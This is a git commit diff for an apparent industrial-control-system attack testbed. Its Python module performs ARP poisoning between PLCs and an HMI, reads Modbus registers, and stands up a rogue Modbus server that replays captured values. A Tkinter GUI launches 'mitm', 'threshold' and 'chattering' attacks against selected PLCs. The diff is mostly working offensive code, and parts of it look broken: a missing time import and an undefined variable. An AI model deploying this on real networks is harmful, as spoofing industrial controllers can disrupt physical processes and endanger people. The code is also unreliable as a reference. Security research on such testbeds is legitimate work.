814240c4079ab73bc20075af2b55d18a6a426bbd
GabrieleGallenti <gabry.gallenti75@hotmail.it>
2023-07-14 08:03:51 -0400

    fix mitm e gui

--- attacks/mitm.py
+++ attacks/mitm.py
@@ -1,10 +1,9 @@
 import argparse
 import json
-from time import time, sleep
 import threading
 import subprocess
 import requests
-from scapy.all import ARP, Ether, srp, sendp
+from scapy.all import ARP, Ether, sr, sendp, sniff, get_if_hwaddr
 import glob
 import os
 import pandas as pd
@@ -16,57 +15,136 @@ import modbus_tk.defines as cst
 from modbus_tk import modbus_tcp, hooks
 import logging
 import itertools
-from time import sleep
+import configparser
 from collections import defaultdict
+from concurrent.futures import ThreadPoolExecutor
 
-# logger
-logger = modbus_tk.utils.create_logger("console", level=logging.DEBUG)
+def handle_arp_packet(packet):
+    if ARP in packet and packet[ARP].op == "is-at":
+        # Elabora il pacchetto ARP qui
+        # Estrarre l'indirizzo MAC e l'indirizzo IP dal pacchetto
+        mac = packet[ARP].hwsrc
+        ip = packet[ARP].psrc
+        print(f"Received ARP Response - IP: {ip}, MAC: {mac}")
 
-logging.basicConfig(filename="plcHistoryTOOL",
-                    filemode='a',
-                    format='%(asctime)s,%(msecs)d %(name)s %(levelname)s %(message)s',
-                    datefmt='%H:%M:%S',
-                    level=logging.DEBUG)
+def p(packet):
+    print(packet)
 
-# parallel distributed execution
-ray.init()
+def get_mac(ip):
+    # Crea il pacchetto ARP per richiedere l'indirizzo MAC
+    arp_request = Ether(dst="ff:ff:ff:ff:ff:ff") / ARP(pdst=ip)
+    print(arp_request)
+    # Invia il pacchetto ARP e ottieni la risposta
+    arp_response, unanswered = sr(ARP(op="who-has", psrc='172.17.0.1', pdst=ip))
+    print("stampa unanswered", unanswered)
+    #sniff(prn=p, filter="arp", store=False)
+    print(arp_response)
+    # Estrai l'indirizzo MAC dalla risposta
+    if arp_response:
+        return arp_response[0][1].hwsrc
+    return None
 
-
-def arp_poison(target_ip, gateway_ip, attacker_mac):
+def arp_poison(target_ip, gateway_ip, plc_ips, hmi_ip, attacker_mac):
+    plc_macs = [get_mac(ip) for ip in plc_ips]
+    print("plc_macs", plc_macs)
+    hmi_mac = get_mac(hmi_ip)
+    print("hmi_mac", hmi_mac)
+    if None in plc_macs or hmi_mac is None:
+        print("Failed to retrieve MAC addresses of PLCs or HMI.")
+        return
+    # Aggiungi la cattura dei pacchetti ARP
+    #sniff(prn=handle_arp_packet, filter="arp", store=False)
     while True:
-        # Create ARP packets for ARP poisoning
-        target_packet = ARP(op=2, pdst=target_ip, hwdst=attacker_mac, psrc=gateway_ip)
-        gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=attacker_mac, psrc=target_ip)
+        for plc_mac in plc_macs:
+            target_packet = ARP(op=2, pdst=target_ip, hwdst=plc_mac, psrc=gateway_ip, hwsrc=attacker_mac)
+            #print("target_packet", target_packet)
+            gateway_packet = ARP(op=2, pdst=gateway_ip, hwdst=plc_mac, psrc=target_ip, hwsrc=attacker_mac)
+            #print("gateway_packet", gateway_packet)
+            sendp(target_packet, verbose=False)
+            sendp(gateway_packet, verbose=False)
 
-        # Send ARP packets for ARP poisoning
-        sendp(target_packet, verbose=False)
-        sendp(gateway_packet, verbose=False)
-
-        # Wait for a certain period before repeating ARP poisoning
         time.sleep(2)
 
+class ModbusServer(threading.Thread):
+    def __init__(self, ip, port, json_files):
+        threading.Thread.__init__(self)
+        self.server = modbus_tcp.TcpServer(address=ip, port=port)
+        self.json_files = json_files
+        self.manual_start = False
+        self.capture_started = threading.Event()  # Event to signal when capture starts
+        self.capture_duration = 0  # Duration of capture in seconds
+        self.captured_data = []  # Captured data from registers
 
-def connect_to_slave(ip, port):
-    """Connect to the slave
+        hooks.install_hook(cst.READ_HOLDING_REGISTERS, self.read_data)
 
-    Args:
-        ip (string): IP of the Modbus slave
-        port (int): Port of the Modbus slave
-    """
-    # Connect to the slave
-    ip = str(ip)
-    port = int(port)
-    master = modbus_tcp.TcpMaster(host=ip, port=port)
-    master.set_timeout(5.0)
-    logger.info("Connected to ip=%s:%s", ip, port)
-    return master
+    def run(self):
+        self.server.start()
+        if self.manual_start:
+            input("Press Enter to start Modbus slave...")
+        else:
+            self.capture_started.wait()  # Wait for capture to start
+            time.sleep(self.capture_duration)  # Wait for the capture duration
+        self.server._do_exit = False
 
+    def stop(self):
+        self.server.stop()
+        self.server._do_exit = True
+
+    def read_data(self, args, slave_id, function_code, starting_address, quantity):
+        response = []
+        for data in self.captured_data:
+            if data['address'] >= starting_address and data['address'] + data['quantity'] <= starting_address + quantity:
+                response.extend(data['values'])
+        return response
+
+def parse_config_file(config_file):
+    config = configparser.ConfigParser()
+    config.read(config_file)
+
+    plc_ips = []
+    plc_ports = []
+    plc_names = []
+    hmi_ip = config.get("Network", "hmi_ip")
+    hmi_port = config.get("Network", "hmi_port")
+
+    for section in config.sections():
+        if section.startswith('PLC'):
+            plc_names.append(section[3:])
+            plc_ips.append(config.get(section, 'ip'))
+            plc_ports.append(config.get(section, 'port'))
+
+    return plc_names, plc_ips, plc_ports, hmi_ip, hmi_port
+
+@ray.remote
+def read_registers(name, ip, port, master, types_of_registers):
+    single_plc_registers = defaultdict(dict)
+
+    if 'DiscreteInputRegisters' in types_of_registers:
+        single_plc_registers[ip]['DiscreteInputRegisters'] = read_di(master)
+    if 'InputRegisters' in types_of_registers:
+        single_plc_registers[ip]['InputRegisters'] = read_ir(master)
+    # Aggiungi qui la lettura degli altri tipi di registri necessari
+
+    with open(f'historian/{name}.json', 'w') as sp:
+        sp.write(json.dumps(single_plc_registers, indent=4))
+
+def capture_registers(plc_names, plc_ips, plc_ports):
+    ray.init()
+    masters = []
+    with ThreadPoolExecutor() as executor:
+        for ip, port in zip(plc_ips, plc_ports):
+            master = modbus_tcp.TcpMaster()
+            master.set_timeout(5.0)
+            master = modbus_tcp.TcpMaster(host=ip, port=int(port))
+            masters.append(master)
+            executor.submit(read_registers, name, ip, port, master, ['DiscreteInputRegisters', 'InputRegisters'])
+    ray.shutdown()
 
 def read_c(master):
-    """Read coils, coils are addressed as follows: [0-xxx].[0-7]
+    """read coils, coils are addressed as follows: [0-xxx].[0-7]
 
     Args:
-        master (object): To send the read command to the right PLC
+        master (object): to send the read command to the right plc
     """
     registers = {}
     values = master.execute(1, cst.READ_COILS, 0, 90)
@@ -78,27 +156,25 @@ def read_c(master):
 
     return registers
 
-
 def read_ir(master):
-    """Read input registers, IRs are addressed as follows: [0-xxx]
+    """read input registers, ir are addressed as follows: [0-xxx]
 
     Args:
-        master (object): To send the read command to the right PLC
+        master (object): to send the read command to the right plc
     """
     registers = {}
-    values = master.execute(1, cst.READ_INPUT_REGISTERS, 0, 11)
+    values = master.execute(1, cst.READ_INPUT_REGISTERS, 0, 110)
     c = 0
     for i in values:
         registers['%IW' + str(c)] = str(i)
         c += 1
     return registers
 
-
 def read_di(master):
-    """Read discrete inputs, DIs are addressed as follows: [0-xxx].[0-7]
+    """read discrete input, di are addressed as follows: [0-xxx].[0-7]
 
     Args:
-        master (object): To send the read command to the right PLC
+        master (object): to send the read command to the right plc
     """
     registers = {}
     values = master.execute(1, cst.READ_DISCRETE_INPUTS, 0, 90)
@@ -109,12 +185,11 @@ def read_di(master):
             count += 1
     return registers
 
-
 def read_mr(master):
-    """Read memory registers, MRs are addressed as follows: [0-xxx] and are holding registers starting from address 1024
+    """read memory registers, mr are addressed as follows: [0-xxx] and are holding registers starting from the address 1024
 
     Args:
-        master (object): To send the read command to the right PLC
+        master (object): to send the read command to the right plc
     """
     registers = {}
     values = master.execute(1, cst.READ_HOLDING_REGISTERS, 1024, 11)
@@ -124,63 +199,37 @@ def read_mr(master):
         c += 1
     return registers
 
-
 def read_hr(master):
-    """Read holding registers, HRs are addressed as follows: [0-xxx]
+    """read holding registers, hr are addressed as follows: [0-xxx]
 
     Args:
-        master (object): To send the read command to the right PLC
+        master (object): to send the read command to the right plc
     """
     registers = {}
-    values = master.execute(1, cst.READ_HOLDING_REGISTERS, 0, 11)
+    values = master.execute(1, cst.READ_HOLDING_REGISTERS, 0, 110)
     c = 0
     for i in values:
         registers['%QW' + str(c)] = str(i)
         c += 1
     return registers
 
-
-@ray.remote
-def read_registers(name, ip, port, jport):
-    name = str(name)
-    ip = str(ip)
-    port = str(port)
-    single_plc_registers = defaultdict(dict)
-    master = connect_to_slave(ip, port)
-    single_plc_registers[ip]['DiscreteInputRegisters'] = read_di(master)
-    single_plc_registers[ip]['InputRegisters'] = read_ir(master)
-    single_plc_registers[ip]['HoldingOutputRegisters'] = read_hr(master)
-    single_plc_registers[ip]['MemoryRegisters'] = read_mr(master)
-    single_plc_registers[ip]['Coils'] = read_c(master)
-
-    # ora = '2022-10-04 18_02_35.803401'
-
-    #with open(f'historian/{name}-{jport}@{ora}.json', 'w') as sp:
-     #   sp.write(json.dumps(single_plc_registers, indent=4))
-
-
-def start_slaves(slaves):
-    """Start the Modbus slaves"""
-    for slave in slaves:
-        slave.start()
-
-
-def stop_slaves(slaves):
-    """Stop the Modbus slaves"""
-    for slave in slaves:
-        slave.stop()
-
+def start_capture(capture_duration, capture_started_event, server, plc_names, plc_ips, plc_ports):
+    time.sleep(capture_duration)  # Wait for the specified capture duration
+    capture_started_event.set()  # Signal that capture has started
+    capture_registers(plc_names, plc_ips, plc_ports)
+    server.stop()
 
 def main():
     parser = argparse.ArgumentParser()
-    parser.add_argument('--plc', nargs='+', help='IP addresses of PLCs')
+    parser.add_argument('--plc', nargs='+', help='IP addresses of PLCs to attack')
     parser.add_argument('--time', type=int, help='Capture duration in minutes')
     parser.add_argument('--prefix', nargs='+', help='Prefixes for JSON file selection, containing PLC info')
     parser.add_argument('--manual', action='store_true', help='Manually start the Modbus slaves')
+    parser.add_argument('--condition', type=str, help='Condition to start the capture')
     args = parser.parse_args()
 
     if not args.plc:
-        print('Please provide the IP addresses of PLCs')
+        print('Please provide the IP addresses of the PLCs to attack')
         return
 
     if not args.time:
@@ -188,7 +237,20 @@ def main():
         return
 
     prefixes = args.prefix
-    plc_ips = args.plc
+
+    config_file = "config.ini"
+
+    config = configparser.ConfigParser()
+    config.read(config_file)
+
+    plc_names, plc_ips, plc_ports, hmi_ip, hmi_port = parse_config_file(config_file)
+
+    print("Config file:", config_file)
+    print("plc_names:", plc_names)
+    print("plc_ips:", plc_ips)
+    print("plc_ports:", plc_ports)
+    print("hmi_ip", hmi_ip)
+    print("hmi_port", hmi_port)
 
     directory = "registerCapture/historian/"
 
@@ -200,36 +262,47 @@ def main():
         print('No JSON files found with the specified prefixes')
         return
 
-    # Creazione degli slave Modbus
-    slaves = []
-    plc_masters = {}  # Dizionario per associare gli indirizzi IP alle istanze```python
+    server_ip = '0.0.0.0'
+    server_port = 508
+
+    server = ModbusServer(server_ip, server_port, json_files)
+
     if args.manual:
-        print("Starting in manual mode...")
-    else:
-        print("Starting in automatic mode...")
+        server.manual_start = True
 
-    for plc_ip in plc_ips:
-        master = connect_to_slave(plc_ip, 5022)  # Modifica la porta se necessario
-        slave = modbus_tcp.TcpServer(address=plc_ip)  # Inizializza il server Modbus per lo slave
-        slave.add_slave(1, master)  # Associa l'istanza del master al numero slave 1
-        slaves.append(slave)  # Aggiungi lo slave alla lista
-        plc_masters[plc_ip] = master  # Associa l'indirizzo IP al master corrispondente
+    server.start()
 
-    # Avvio dei server Modbus per gli slave
-    if not args.manual:
-        start_slaves(slaves)
+    print(f"Modbus Server running on {server_ip}:{server_port}")
 
-    t_end = time.time() + args.time * 60
+    target_ip = plc_ips[0].split(":")[0]
+    print("target_ip",target_ip)
+    gateway_ip = hmi_ip
+    print("gateway_ip",gateway_ip)
+    attacker_mac = get_if_hwaddr('docker0')  # Replace "eth0" with your network interface name
+    print("attacker_mac",attacker_mac)
+    arp_poison_thread = threading.Thread(target=arp_poison, args=(target_ip, gateway_ip, plc_ips, hmi_ip, attacker_mac))
+    arp_poison_thread.start()
 
-    while time.time() < t_end:
-        for plc_ip in plc_ips:
-            read_registers.remote(f"plc-{plc_ip}", plc_ip, 5022,8503)  # Modifica la porta se necessario
-        sleep(0.8)
-    
-    # Arresto dei server Modbus per gli slave
-    if not args.manual:
-        stop_slaves(slaves)
+    try:
+        if args.condition:
+            print(f"Waiting for condition '{args.condition}' to start the capture...")
+            while True:
+                # Implement your condition logic here
+                if args.condition == 'start':
+                    capture_duration = args.time * 60  # Capture duration in seconds
+                    capture_started_event = threading.Event()
+                    capture_thread = threading.Thread(target=start_capture, args=(capture_duration, capture_started_event, server, plc_names, plc_ips, plc_ports))
+                    capture_thread.start()
+                    server.capture_duration = capture_duration
+                    server.capture_started = capture_started_event
+                    break
+                time.sleep(1)  # Wait for 1 second before checking the condition again
+        else:
+            time.sleep(args.time * 60)  # Capture duration in minutes
+    except KeyboardInterrupt:
+        pass
 
+    arp_poison_thread.join()
 
 if __name__ == '__main__':
     main()
--- gui.py
+++ gui.py
@@ -3,22 +3,22 @@ from subprocess import Popen, PIPE, STDOUT
 from threading import Thread
 from tkinter import *
 from tkinter import ttk
-import mitm
+from attacks import mitm
+import subprocess
+
 
 class App:
-    ATTACK_CMD = ["python", "attacks/mitm.py"]
+    ATTACK_CMD = ["plc-attack", "-c", "config.ini"]
+
+    MITM_CMD = ["python", "-m", "attacks.mitm"]
 
     ATTACKS = {
         "threshold": "attacks/threshold.py",
         "chattering": "attacks/chattering.py",
-        "mitm": "attacks/mitm.py"
+        "mitm": "attacks/mitm.py",
     }
-    
-    IP = {
-        "PLC1": "192.168.20.101",
-        "PLC2": "192.168.20.102",
-        "PLC3": "192.168.20.103"
-    }
+
+    IP = {"PLC1": "127.0.0.1", "PLC2": "127.0.0.1", "PLC3": "127.0.0.1"}
 
     def __init__(self, master):
         self.master = master
@@ -41,18 +41,38 @@ class App:
         self.lbl_attack_selection = Label(self.cmd_frame, text="Select attack type")
         self.lbl_attack_selection.grid(row=1, column=0, columnspan=3, sticky="ew", pady=5)
 
-        self.cbx_attack_selection = ttk.Combobox(self.cmd_frame, values=list(App.ATTACKS.keys()), state='readonly')
+        self.cbx_attack_selection = ttk.Combobox(
+            self.cmd_frame, values=list(App.ATTACKS.keys()), state="readonly"
+        )
         self.cbx_attack_selection.current(0)
-        self.cbx_attack_selection.grid(row=2, column=0, columnspan=3, sticky="ew", pady=5, padx=20)
+        self.cbx_attack_selection.grid(
+            row=2, column=0, columnspan=3, sticky="ew", pady=5, padx=20
+        )
+        self.cbx_attack_selection.bind("<<ComboboxSelected>>", self.on_attack_selection)
 
-        self.lbl_dynamic_selection = Label(self.cmd_frame, text="Select PLC")
-        self.lbl_dynamic_selection.grid(row=3, column=0, columnspan=3, sticky="ew", pady=5)
-        
-        self.dynamic_cbx_selection = ttk.Combobox(self.cmd_frame, state='disabled')
-        self.dynamic_cbx_selection.grid(row=4, column=0, columnspan=3, sticky="ew", pady=5, padx=20)
+        self.dynamic_cbx_frame_ip = Frame(self.cmd_frame)
 
-        self.cbx_attack_selection.bind("<<ComboboxSelected>>", self.on_attack_selection)      
-        
+        self.lbl_dynamic_cbx_ip = Label(self.dynamic_cbx_frame_ip, text="Select PLC")
+        self.lbl_dynamic_cbx_ip.pack(side=LEFT, padx=(0, 5))
+
+        picks = list(App.IP.keys())
+        self.ip_picked = []
+        for pick in picks:
+            var = IntVar()
+            chk = Checkbutton(self.dynamic_cbx_frame_ip, text=pick, variable=var)
+            chk.pack(side=LEFT, anchor=W, expand=YES)
+            self.ip_picked.append(var)
+
+        self.dynamic_cbx_frame_time = Frame(self.cmd_frame)
+
+        self.lbl_dynamic_cbx_time = Label(
+            self.dynamic_cbx_frame_time, text="Select Time (minutes)"
+        )
+        self.lbl_dynamic_cbx_time.pack(side=LEFT, padx=(0, 5))
+
+        self.entry_time = Entry(self.dynamic_cbx_frame_time, state="normal")
+        self.entry_time.pack(side=LEFT)
+
         self.action_frame = Frame(self.cmd_frame)
         self.action_frame.grid(row=5, column=0, sticky="ew", padx=5, pady=15)
 
@@ -62,65 +82,115 @@ class App:
         self.btn_frame = Frame(self.action_frame)
         self.btn_frame.grid(row=1, column=0, sticky="ew", pady=5)
 
-        self.btn_start = Button(self.btn_frame, text="Start attack", command=self.start_attack)
-        self.btn_start.grid(row=0, column=0, sticky="ew",padx=5)
+        self.btn_start = Button(
+            self.btn_frame, text="Start attack", command=self.start_main
+        )
+        self.btn_start.grid(row=0, column=0, sticky="ew", padx=5)
         self.btn_stop = Button(self.btn_frame, text="Stop attack", command=self.stop_attack)
         self.btn_stop["state"] = "disabled"
-        self.btn_stop.grid(row=0, column=1, sticky="ew",padx=5)
+        self.btn_stop.grid(row=0, column=1, sticky="ew", padx=5)
+        self.btn_clear = Button(self.btn_frame, text="Clear", command=self.clear_output)
+        self.btn_clear.grid(row=0, column=2, sticky="ew", padx=5)
         self.btn_exit = Button(self.btn_frame, text="Exit", fg="red", command=self.exit)
-        self.btn_exit.grid(row=0, column=2, sticky="ew", padx=5)
+        self.btn_exit.grid(row=0, column=3, sticky="ew", padx=5)
+        
 
-        self.text_box = Text(bg="black", fg="white", state='disabled')
+        self.text_box = Text(bg="black", fg="white", state="disabled")
         self.text_box.grid(row=0, column=1, sticky="nsew", pady=20, padx=20)
+
 
     def on_attack_selection(self, event):
         selected_attack = self.cbx_attack_selection.get()
-        
+
         if selected_attack == "mitm":
-            self.dynamic_cbx_selection.configure(state='readonly')
-            self.dynamic_cbx_selection['values'] = list(App.IP.keys())
-            self.dynamic_cbx_selection.current(0)
+            self.dynamic_cbx_frame_ip.grid(
+                row=3, column=0, columnspan=3, sticky="ew", padx=20, pady=5
+            )
+            self.dynamic_cbx_frame_time.grid(
+                row=4, column=0, columnspan=3, sticky="ew", padx=20, pady=5
+            )
         else:
-            self.dynamic_cbx_selection.configure(state='disabled')
-            self.dynamic_cbx_selection.set("")
-            
-    def on_dynamic_cbx_selection(self, event):
-        selected_parameters = self.dynamic_cbx_selection.get()
-            
+            self.dynamic_cbx_frame_ip.grid_forget()
+            self.dynamic_cbx_frame_time.grid_forget()
+
+    def start_main(self):
+        attack_key = self.cbx_attack_selection.get()
+        if attack_key == "mitm":
+            self.start_mitm()
+        else:
+            self.start_attack()
+
+
+    def start_mitm(self):
+        attack_key = self.cbx_attack_selection.get()
+        if attack_key == "mitm":
+            ip_addresses = [
+                App.IP[key]
+                for key, var in zip(App.IP.keys(), self.ip_picked)
+                if var.get() == 1
+            ]
+            plc_names = [
+                key.lower()
+                for key, var in zip(App.IP.keys(), self.ip_picked)
+                if var.get() == 1
+            ]
+            time_value = self.entry_time.get()
+
+            cmd = App.MITM_CMD.copy()
+            cmd.extend(["--plc"] + ip_addresses)
+            cmd.extend(["--time", time_value])
+            cmd.extend(["--prefix"] + plc_names)
+
+            self.text_box.delete("0.0", END)
+            self.btn_start["state"] = "disabled"
+            self.btn_stop["state"] = "normal"
+            self.attack = Popen(cmd, stdout=PIPE, stderr=STDOUT)
+            thread = Thread(target=self.read_output, args=(self.attack.stdout,))
+            thread.start()
+
+
     def start_attack(self):
         attack_key = self.cbx_attack_selection.get()
         attack_script_path = App.ATTACKS[attack_key]
         cmd = App.ATTACK_CMD.copy()
         cmd.append(attack_script_path)
-
         self.text_box.delete("0.0", END)
         self.btn_start["state"] = "disabled"
         self.btn_stop["state"] = "normal"
         self.attack = Popen(cmd, stdout=PIPE, stderr=STDOUT)
-        thread = Thread(target=self.read_output, args=(self.attack.stdout, ))
+        thread = Thread(target=self.read_output, args=(self.attack.stdout,))
         thread.start()
+
 
     def stop_attack(self):
         self.attack.terminate()
         self.btn_stop["state"] = "disabled"
         self.btn_start["state"] = "normal"
 
+
     def read_output(self, pipe):
         while True:
             data = os.read(pipe.fileno(), 1 << 20)
             data = data.replace(b"\r\n", b"\n")
             if data:
-                self.text_box.configure(state='normal')
+                self.text_box.configure(state="normal")
                 self.text_box.insert("end", data.decode())
                 self.text_box.see("end")
-                self.text_box.configure(state='disabled')
+                self.text_box.configure(state="disabled")
             else:
                 return None
-    
+
+
     def exit(self):
         if self.attack:
             self.attack.terminate()
         self.master.destroy()
+    
+    def clear_output(self):
+    	self.text_box.configure(state="normal")
+    	self.text_box.delete("1.0", END)
+    	self.text_box.configure(state="disabled")
+
 
 
 root = Tk()
